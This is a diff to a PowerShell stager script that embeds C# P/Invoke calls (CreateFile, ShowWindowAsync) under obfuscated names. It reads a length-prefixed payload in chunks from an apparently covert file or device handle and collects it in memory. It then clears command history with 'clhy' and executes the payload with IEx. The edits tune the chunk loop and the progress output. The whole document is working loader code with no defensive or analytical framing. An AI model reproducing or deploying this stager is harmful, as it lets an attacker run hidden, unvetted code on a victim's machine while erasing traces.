@@ -13,7 +13,7 @@ using System.Runtime.InteropServices;
 namespace n {
 	public class w {
 		[DllImport(%kernel32.dll%, CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
+		public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
 		[DllImport(%user32.dll%)]
 		public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
 
@@ -35,26 +35,24 @@ function stage() {
 	}
 	try {
 		$f = [n.w]::o($fn)
-    $g = 0
-    $e = 0
-    $s = New-Object IO.MemoryStream
-    do {
+		$g = $e = 0
+		$s = New-Object IO.MemoryStream
+		do {
+			$o = 0
 			$b = New-Object Byte[] ($M+1)
-			$b[2] = 2
 			$f.Write($b, 0, $M+1)
 			$r = $f.Read($b, 0, $M+1)
-			if ($b[1] -ge 2) {
-				$o = 0
+			if ($b[1] -gt 0) {
 				if ($e -eq 0) {
 					$e = ($b[2]*256)+$b[3]
 					$o = 2
 				}
 				$s.Write($b, $o+2, $b[1]-$o)
 				$g+=$b[1]-$o
-				[System.Console]::Write($b, $o+2, $b[1]-$o)
-				# [System.Console]::WriteLine([String]::Format('{0} of {1}',$g, $e))
+				# [System.Console]::Write($b, $o+2, $b[1]-$o)
+				[System.Console]::WriteLine([String]::Format('{0} of {1}',$g, $e))
 			}
-    } while ($g -lt $e -or $e -eq 0)
+		} while ($g -lt $e -or $e -eq 0)
 		clhy
 		IEx ([Text.Encoding]::ASCII).GetString($s.ToArray())
 	} catch {
@@ -63,3 +61,4 @@ function stage() {
 	exit
 }
 stage
+
